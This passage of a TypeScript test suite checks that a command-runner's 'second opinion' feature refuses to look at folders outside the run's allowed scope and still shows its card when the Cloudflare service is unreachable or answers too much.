    const sandbox = mkdtempSync(join(tmpdir(), 'mwa-so-sbx-'));
    writeFileSync(join(repo, 'src', 'private.ts'), 'TOPSECRET_PRIVATE_DATA\n');
    const before = states.length;
    try {
      const out = await run.handler({ command: `cd ${repo} && git add src/private.ts && git commit -m x` }, { sandboxDir: sandbox, interactive: true });
      const id = /confirmation_id: (\S+)/.exec(out)![1];
      expect(pendingMeta(id)!.summary.split('\n')[0]).toMatch(/unavailable — the folder the command names is outside the folders this run may use/);
      expect(states.length).toBe(before);
    } finally { rmSync(sandbox, { recursive: true, force: true }); }
  });

  it('a granted subfolder of a bigger repository is not a way to read the rest of it', async () => {
    const before = states.length;
    const r = await secondOpinionForCommand('git commit -am x', join(repo, 'src'), (d) => d.replace(/\\/g, '/').toLowerCase().includes('/src'));
    expect(r!.lines[0]).toMatch(/the repository reaches outside the folders this run may use/);
    expect(states.length).toBe(before);
  });

  it('Cloudflare being down, or answering too much, never stops the card', async () => {
    writeFileSync(join(repo, 'src', 'a.ts'), 'export const a = 5;\n');
    process.env.CLOUDFLARE_API_BASE = 'http://127.0.0.1:9'; // nothing listens (port 9 is not a "bad port")
    try {
      expect((await secondOpinionForCommand('git commit -am x', repo, () => true))!.lines[0]).toMatch(/unavailable — could not reach Cloudflare/);
    } finally { process.env.CLOUDFLARE_API_BASE = base; }
    huge = true;
    try {
      expect((await secondOpinionForCommand('git commit -am x', repo, () => true))!.lines[0]).toMatch(/unavailable — the answer was too large/);
    } finally { huge = false; }
  });
});
